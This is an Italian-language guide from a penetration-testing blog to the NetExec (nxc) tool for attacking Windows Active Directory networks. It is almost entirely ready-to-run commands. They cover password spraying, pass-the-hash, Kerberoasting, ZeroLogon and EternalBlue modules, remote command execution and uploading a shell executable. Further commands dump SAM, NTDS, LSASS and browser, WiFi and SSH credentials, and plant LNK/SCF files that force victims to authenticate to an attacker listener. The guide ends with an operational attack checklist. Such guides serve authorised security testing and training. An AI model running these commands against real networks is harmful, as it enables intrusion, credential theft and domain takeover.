---
title: 'NetExec (NXC): Guida Completa al Successore di CrackMapExec'
slug: netexec
description: 'Guida operativa completa a NetExec (nxc): SMB, LDAP, WinRM, RDP, moduli avanzati, credential dumping, vulnerability scan e lateral movement in Active Directory'
image: /Gemini_Generated_Image_jxrwbzjxrwbzjxrw.webp
draft: false
date: 2026-01-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - netexec
  - nxc
featured: false
---

# NetExec (NXC): Guida Completa a Active Directory, SMB e LDAP

NetExec (nxc) è il successore diretto di CrackMapExec — nato nel 2023 dopo l'abbandono del progetto originale. Stessa filosofia, codebase migliorata, moduli estesi, manutenzione attiva. Se usi ancora `crackmapexec` stai usando uno strumento fermo al 2021.

Per il confronto con il vecchio CME: [CrackMapExec su HackIta](https://hackita.it/articoli/crackmapexec)

***

## Installazione

```bash
python3 -m pip install pipx
pipx ensurepath
pipx install netexec
```

Verifica:

```bash
nxc --help
nxc smb -L    # lista moduli SMB disponibili
nxc ldap -L   # lista moduli LDAP disponibili
```

***

## Sintassi base

```bash
nxc <protocollo> <target> -u <utente> -p <password> [-M modulo] [-o opzione=valore]
```

Protocolli supportati: `smb`, `ldap`, `winrm`, `rdp`, `mssql`, `ssh`, `ftp`, `vnc`, `wmi`, `nfs`

Target flessibili — puoi specificare IP singolo, range, CIDR, file o combinazione:

```bash
nxc smb 10.10.10.10
nxc smb 10.10.10.0/24
nxc smb 10.10.10.10-22
nxc smb targets.txt
nxc smb DC.hackita.local 10.10.10.0/24 targets.txt
```

***

## Fase 0 — Ricognizione senza credenziali

Il primo passo in qualsiasi assessment interno è capire cosa c'è sulla rete. NXC ti dà OS, dominio, SMB signing e versione in un solo comando.

### Scan subnet SMB

```bash
nxc smb 10.10.10.0/24
```

Output: OS, nome dominio, SMB signing, versione SMB. Serve per identificare host legacy, capire se sei in dominio, valutare la possibilità di [NTLM relay](https://hackita.it/articoli/responder/).

### Null session e accesso anonimo

```bash
nxc smb 10.10.10.10 --null-session
nxc smb 10.10.10.10 -u '' -p ''
nxc smb 10.10.10.10 -u 'guest' -p ''
nxc ftp 10.10.10.0/24 -u 'anonymous' -p '' --ls
```

### Enumerazione utenti senza credenziali

```bash
nxc smb 10.10.10.10 -u '' -p '' --users
nxc smb 10.10.10.10 -u '' -p '' --rid-brute
```

Il RID brute-forcing enumera SID locali e di dominio senza autenticazione se il DC lo permette — tecnica efficace per costruire una lista utenti prima dello spraying.

***

## Fase 1 — Autenticazione

L'output chiave è:

* `[+]` → credenziale valida
* `(Pwn3d!)` → admin locale — pivot possibile

### Password

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@'
nxc smb 10.10.10.0/24 -u hackita -p 'Hackita1@'    # su tutta la subnet
```

### Pass-the-Hash (PTH)

PTH sfrutta l'hash NTLM direttamente, senza conoscere la password in chiaro — tipico dopo un dump SAM o NTDS. Per approfondire: [Pass-the-Hash su HackIta](https://hackita.it/articoli/pass-the-hash/).

```bash
nxc smb 10.10.10.10 -u hackita -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

### Kerberos (con TGT in ccache)

```bash
export KRB5CCNAME=/tmp/hackita.ccache
nxc smb 10.10.10.10 -u hackita --kerberos
```

### Autenticazione locale (no dominio)

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --local-auth
```

### Certificato (PKINIT)

Utile dopo aver ottenuto un PFX via ADCS — vedi [ESC1-ESC16 su HackIta](https://hackita.it/articoli/adcs-esc1-esc16/).

```bash
nxc ldap 10.10.10.10 -u hackita -p '' --certificate hackita.pfx
```

***

## Fase 2 — Password Spraying

Lo spraying testa poche password su molti account — a differenza del bruteforce non fa scattare il lockout. Prima di partire **leggi sempre la password policy**.

### Controlla la policy prima di spraying

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --pass-pol
```

### Un utente, molte password

```bash
nxc smb 10.10.10.0/24 -u administrator -p passwords.txt
```

### Molti utenti, una password

```bash
nxc smb 10.10.10.0/24 -u users.txt -p 'Summer2024'
nxc smb 10.10.10.0/24 -u users.txt -p 'Hackita1@' --continue-on-success
```

### Coppie username:password (no bruteforce — testa solo la coppia corrispondente)

```bash
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

***

## Fase 3 — Enumerazione SMB

[SMB](https://hackita.it/articoli/smb/) è il protocollo più ricco in un assessment AD — share, utenti, sessioni attive, policy.

### Share

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --shares
```

### Spider completo di tutte le share

Il modulo `spider_plus` esegue un crawling ricorsivo di tutte le share accessibili e salva i risultati in JSON — molto più veloce di un listing manuale.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spider_plus
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spider_plus -o READ_ONLY=false
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spider_plus -o DOWNLOAD_FLAG=TRUE EXCLUDE_FILTER=c$,ipc$,admin$
```

### File operations

```bash
# Download
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --share C$ --get-file Users\hackita\Documents\creds.txt creds.txt
# Upload
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --share C$ --put-file shell.exe Temp\shell.exe
```

### Utenti, gruppi, sessioni

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --users
```

Output esempio:

```
SMB  10.10.10.10  445  DC01  [*] Enumerated 3 domain users
SMB  10.10.10.10  445  DC01  hackita.local\adminHackita      badpwdcount: 0  desc: Domain Administrator
SMB  10.10.10.10  445  DC01  hackita.local\editorHackita     badpwdcount: 0  desc: Blog Editor Account
SMB  10.10.10.10  445  DC01  hackita.local\developerHackita  badpwdcount: 2  desc: Dev - temp account
```

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --groups
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --local-groups
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --loggedon-users
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --qwinsta      # sessioni RDP attive con IP sorgente e stato
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --tasklist     # processi in esecuzione via protocollo nativo (meno rumoroso di tasklist cmd)
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --sessions
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --computers
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' --rid-brute
```

Output esempio `--rid-brute`:

```
SMB  10.10.10.10  445  DC01  498: hackita.local\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB  10.10.10.10  445  DC01  500: hackita.local\adminHackita (SidTypeUser)
SMB  10.10.10.10  445  DC01  501: hackita.local\Guest (SidTypeUser)
SMB  10.10.10.10  445  DC01  502: hackita.local\krbtgt (SidTypeUser)
SMB  10.10.10.10  445  DC01  512: hackita.local\Domain Admins (SidTypeGroup)
SMB  10.10.10.10  445  DC01  1000: hackita.local\editorHackita (SidTypeUser)
SMB  10.10.10.10  445  DC01  1001: hackita.local\developerHackita (SidTypeUser)
```

***

## Fase 4 — Enumerazione LDAP

LDAP espone l'intera struttura del dominio — utenti, macchine, deleghe, policy. Tutto accessibile con un account a basso privilegio. Per approfondire: [ldapsearch su HackIta](https://hackita.it/articoli/ldapsearch/).

### Base

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --users
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --groups
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --computers
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --admin-count
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --trusted-for-delegation
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --password-not-required
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --find-delegation
```

### Query LDAP manuale

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --query "(name=administrator)" "msDS-AllowedToDelegateTo cn"
```

### AS-REP Roasting

Gli account senza pre-autenticazione Kerberos espongono un hash craccabile offline. Per approfondire: [Kerberos su HackIta](https://hackita.it/articoli/kerberos/).

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --asreproast asrep.txt
nxc ldap 10.10.10.10 -u '' -p '' --asreproast asrep.txt    # senza credenziali se possibile
```

### Kerberoasting

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --kerberoasting kerb.txt
```

### BloodHound collection senza SharpHound

BloodHound mappa i path di privilege escalation — questa opzione raccoglie i dati direttamente via LDAP senza caricare eseguibili sul target. Per approfondire: [BloodHound su HackIta](https://hackita.it/articoli/bloodhound/).

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --bloodhound -ns 10.10.10.10 -c All
```

***

## Fase 5 — Moduli LDAP Avanzati

### ADCS — Certificate Authority

Trova CA, template e configurazioni ESC vulnerabili. Complementare a Certipy — vedi [ADCS ESC1-ESC16 su HackIta](https://hackita.it/articoli/adcs-esc1-esc16/).

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M adcs
```

### DACL — Lettura ACL

Enumera i permessi sugli oggetti AD — utile per trovare GenericAll, WriteDACL, GenericWrite sfruttabili per privilege escalation.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M daclread -o TARGET=victim PRINCIPAL=hackita RIGHTS='*'
```

### LAPS — Password amministratore locale

LAPS gestisce password univoche per ogni macchina. Se l'account ha i permessi per leggerle, ottieni admin locale su tutti i target.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M laps
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M laps
```

### GMSA — Group Managed Service Accounts

Le GMSA hanno password rotanti gestite dal dominio. Se hai ReadGMSAPassword puoi dumpare l'hash e usarlo per PTH.

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --gmsa
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --gmsa-convert-id <id>
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' --gmsa-decrypt-lsa <gmsa_account>
```

### Descrizioni utenti — spesso contengono credenziali in chiaro

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M get-desc-users
```

### Machine Account Quota

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M maq
```

Se MAQ > 0 puoi aggiungere macchine al dominio — prerequisito per attacchi RBCD.

### Account pre-Windows 2000

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M pre2k
```

Questi account hanno spesso password = nome account. Trovati ancora in ambienti enterprise legacy.

### OS obsoleti

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M obsolete
```

### DNS records

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M get-network
```

### Trust tra domini

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M enum_trusts
```

### LDAP signing e channel binding

```bash
nxc ldap 10.10.10.10 -u hackita -p 'Hackita1@' -M ldap-checker
```

***

## Fase 6 — Vulnerability Scan

### Scan vulnerabilità in blocco

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M zerologon -M nopac -M printnightmare -M smbghost -M ms17-010
```

### ZeroLogon (CVE-2020-1472)

Permette di azzerare la password del DC senza credenziali. Altamente distruttivo — solo in lab.

```bash
nxc smb 10.10.10.10 -u '' -p '' -M zerologon
```

### noPAC (CVE-2021-42278/42287)

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M nopac
```

### PrintNightmare

```bash
nxc smb 10.10.10.10 -u '' -p '' -M printnightmare
```

### MS17-010 (EternalBlue)

```bash
nxc smb 10.10.10.10 -u '' -p '' -M ms17-010
```

### SMBGhost (CVE-2020-0796)

```bash
nxc smb 10.10.10.10 -u '' -p '' -M smbghost
```

### NTLM Reflection (CVE-2025-33073)

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M ntlm_reflection
```

### Coerce vulnerabilities

Controlla tutti i vettori di coercion in un colpo: PetitPotam, DFSCoerce, PrinterBug, MSEven, ShadowCoerce. Da combinare con [Responder](https://hackita.it/articoli/responder/) o ntlmrelayx.

```bash
nxc smb 10.10.10.10 -u '' -p '' -M coerce_plus
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M coerce_plus -o LISTENER=10.10.14.1
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M coerce_plus -o LISTENER=10.10.14.1 ALWAYS=true
```

### Timeroasting

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M timeroast
```

### WebDAV (WebClient service — utile per relay HTTP)

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M webdav
```

### Print Spooler

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M spooler
```

### ADCS CA via SMB

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M enum_ca
```

### Interfacce di rete aggiuntive

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M ioxidresolver
```

***

## Fase 7 — Esecuzione Comandi

Non appena ottieni `(Pwn3d!)` puoi eseguire comandi remoti via diversi metodi. NXC prova wmiexec di default — puoi forzarne uno specifico.

### CMD via SMB

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami --exec-method smbexec
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami --exec-method wmiexec
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -x whoami --exec-method atexec
```

### PowerShell

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -X "whoami /all"
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -X "Get-Process | Select-Object Name,Id"
```

### WinRM

```bash
nxc winrm 10.10.10.10 -u hackita -p 'Hackita1@' -x whoami
nxc winrm 10.10.10.10 -u hackita -p 'Hackita1@' -X "ipconfig /all"
```

### RDP (da v1.4.0)

```bash
nxc rdp 10.10.10.10 -u hackita -p 'Hackita1@' -x "whoami /all"
```

### Shadow RDP — eavesdrop su sessione RDP attiva

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M shadowrdp
```

***

## Fase 8 — Credential Dumping

La fase post-exploitation più importante. Per approfondire il dump credenziali su Windows: [Impacket su HackIta](https://hackita.it/articoli/impacket/).

### SAM — hash utenti locali

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --sam
```

### LSA secrets — credenziali servizi e chiavi macchina

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --lsa
```

### NTDS — tutti gli hash del dominio (solo sul DC)

Il dump NTDS equivale a un DCSync — ottieni tutti gli hash del dominio. Per approfondire: [DCSync su HackIta](https://hackita.it/articoli/dcsync/).

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --ntds --user hackita
```

### DPAPI — credenziali browser, vault Windows

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' --dpapi
```

### LSASS dump con lsassy

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M lsassy
```

### Mimikatz remoto

Per approfondire: [Mimikatz su HackIta](https://hackita.it/articoli/mimikatz/).

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M mimikatz
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
```

### Token impersonation

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M impersonate
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M impersonate -o Token=1 EXEC="whoami"
```

### GPP passwords (SYSVOL)

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M gpp_password
```

### MSOL — Azure AD Sync credentials

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M msol
```

### Backup Operator → dump NTDS

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M backup_operator
```

### Credenziali applicazioni — moduli specializzati

```bash
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M veeam          # Veeam backup
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M winscp          # WinSCP sessions
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M putty           # PuTTY SSH keys
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M iis             # IIS credentials
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M wifi            # WiFi passwords
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M powershell_history
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M eventlog_creds
nxc smb 10.10.10.10 -u administrator -p 'Hackita1@' -M notepad++
```

***

## Fase 9 — Coercion e NTLM Capture

Questi moduli piazzano file su share scrivibili che forzano il client a autenticarsi verso un server controllato dall'attaccante — catturando hash NTLMv2. Da combinare con [Responder](https://hackita.it/articoli/responder/).

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M slinky -o SERVER=10.10.14.1          # LNK shortcut
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M scuffy -o SERVER=10.10.14.1          # SCF file
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M drop-sc -o SERVER=10.10.14.1         # SearchConnector
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M drop-library-ms -o SERVER=10.10.14.1 # CVE-2025-24054
```

***

## Fase 10 — AV/EDR Enumeration

Prima di eseguire moduli rumorosi è utile sapere cosa sta girando sul target.

```bash
nxc smb 10.10.10.10 -u hackita -p 'Hackita1@' -M enum_av
```

***

## MSSQL

```bash
# Autenticazione
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@'

# Query SQL
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -q "SELECT name FROM master.dbo.sysdatabases"

# Abilitare xp_cmdshell
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -M enable_cmdshell -o ACTION=enable

# Esecuzione comando
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -x whoami

# Coercion via MSSQL
nxc mssql 10.10.10.15 -u hackita -p 'Hackita1@' -M mssql_coerce -o LISTENER=10.10.14.1
```

***

## Output e Database

NXC salva automaticamente tutti i risultati in un database locale consultabile con `nxcdb`.

```bash
nxc smb 10.10.10.0/24 -u hackita -p 'Hackita1@' --output output.csv
nxcdb    # console interattiva
```

***

## Checklist Operativa

```
[ ] Scan subnet — identificare host e dominio
[ ] Null session — testare senza credenziali
[ ] Ottenuta prima credenziale → password policy prima di spraying
[ ] Password spray — --continue-on-success
[ ] Enumera share — --shares + spider_plus
[ ] Enumera utenti/gruppi via LDAP
[ ] Descrizioni utenti — -M get-desc-users
[ ] AS-REP Roasting e Kerberoasting
[ ] GMSA, LAPS
[ ] BloodHound collection via LDAP
[ ] MAQ → valuta RBCD
[ ] Vulnerability scan — zerologon, nopac, coerce_plus
[ ] WebDAV/Spooler — valuta vettori relay
[ ] (Pwn3d!) → SAM, LSA, DPAPI, lsassy
[ ] Admin su DC → NTDS dump
[ ] Moduli app — veeam, winscp, putty, msol
[ ] Documenta tutto con --output
```

***

## Tabella Moduli SMB

| Modulo               | Scopo                           |
| -------------------- | ------------------------------- |
| `spider_plus`        | Spider ricorsivo tutte le share |
| `lsassy`             | Dump LSASS                      |
| `mimikatz`           | Mimikatz remoto                 |
| `laps`               | Password LAPS                   |
| `gpp_password`       | GPP credentials in SYSVOL       |
| `enum_av`            | AV/EDR installati               |
| `enum_ca`            | Certificate Authority ADCS      |
| `webdav`             | WebClient service (relay HTTP)  |
| `spooler`            | Print Spooler                   |
| `coerce_plus`        | Tutti i vettori di coercion     |
| `zerologon`          | CVE-2020-1472                   |
| `nopac`              | CVE-2021-42278/42287            |
| `ms17-010`           | EternalBlue                     |
| `timeroast`          | Timeroasting NTP hash           |
| `slinky`             | LNK su share scrivibili         |
| `drop-library-ms`    | CVE-2025-24054                  |
| `backup_operator`    | NTDS dump via Backup Operator   |
| `veeam`              | Credenziali Veeam               |
| `msol`               | Azure AD Sync credentials       |
| `shadowrdp`          | Eavesdrop sessioni RDP          |
| `impersonate`        | Token impersonation             |
| `winscp`             | WinSCP saved sessions           |
| `putty`              | PuTTY SSH keys                  |
| `iis`                | IIS credentials                 |
| `wifi`               | WiFi passwords                  |
| `powershell_history` | PS history dump                 |
| `notepad++`          | Notepad++ unsaved content       |

## Tabella Moduli LDAP

| Modulo           | Scopo                    |
| ---------------- | ------------------------ |
| `adcs`           | Trova CA e template      |
| `daclread`       | Leggi ACL su oggetti AD  |
| `laps`           | Password LAPS via LDAP   |
| `gmsa`           | GMSA password            |
| `maq`            | MachineAccountQuota      |
| `pre2k`          | Account pre-Windows 2000 |
| `get-desc-users` | Descrizioni utenti       |
| `get-network`    | DNS records              |
| `enum_trusts`    | Trust tra domini         |
| `ldap-checker`   | LDAP signing/binding     |
| `obsolete`       | OS obsoleti              |

***

*Guida aggiornata a NetExec v1.4.0+ (2026). Per approfondire Active Directory: [Guida AD su HackIta](https://hackita.it/articoli/active-directory/)*
